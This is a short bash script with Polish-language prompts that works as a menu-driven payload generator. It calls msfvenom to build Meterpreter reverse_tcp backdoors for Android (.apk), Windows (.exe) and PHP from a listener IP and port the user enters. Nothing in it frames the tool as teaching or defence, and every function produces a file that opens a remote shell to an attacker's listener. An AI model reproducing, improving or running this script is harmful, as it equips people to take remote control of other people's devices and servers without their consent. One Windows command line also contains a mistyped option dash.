#!/bin/bash
figlet payload generator
echo "by przemekszmaj"


android()
{
	echo " Podaj adres IP do polaczenia"
	read adres_ip
	echo " Podaj numer portu do nasluchiwania" 
	read numer_portu
	echo " Jak ma nazywac sie plik?"
	read nazwa
	msfvenom --platform Android --arch dalvik -p android/meterpreter/reverse_tcp LHOST=$adres_ip LPORT=$numer_portu R > $nazwa.apk
	sudo chmod 777 $nazwa.apk
	sudo ./msfvenom_generator.sh
}

windows_10()
{
	echo " Podaj adres IP do polaczenia"
	read adres_ip
	echo " Podaj numer portu do nasluchiwania" 
	read numer_portu
	echo " Jak ma nazywac sie plik?"
	read nazwa
	msfvenom -p windows/meterpreter/reverse_tcp -a x86 –platform windows -f exe LHOST=$adres_ip LPORT=$numer_portu -o $nazwa.exe
	sudo chmod 777 $nazwa.exe
	sudo ./msfvenom_generator.sh
}

php()
{
	echo " Podaj adres IP do polaczenia"
	read adres_ip
	echo " Podaj numer portu do nasluchiwania" 
	read numer_portu
	echo " Jak ma nazywac sie plik?"
	read nazwa
	msfvenom -p php/meterpreter/reverse_tcp LHOST=$adres_ip LPORT=$numer_portu -f raw -o $nazwa.php
	sudo chmod 777 $nazwa.php
	sudo ./msfvenom_generator.sh
}




echo ""
echo -e " [00]  \e[31m Android Payload \e[0m"
echo -e " [01]  \e[31m Windows 10 Payload \e[0m"	
echo -e " [02]  \e[31m PHP Payload\e[0m"





read opcja
case "$opcja" in

  "00") android ;; 
  "01") windows_10 ;;
  "02") php ;;

  



  *) clear && ./msfvenom_generator.sh
  
esac
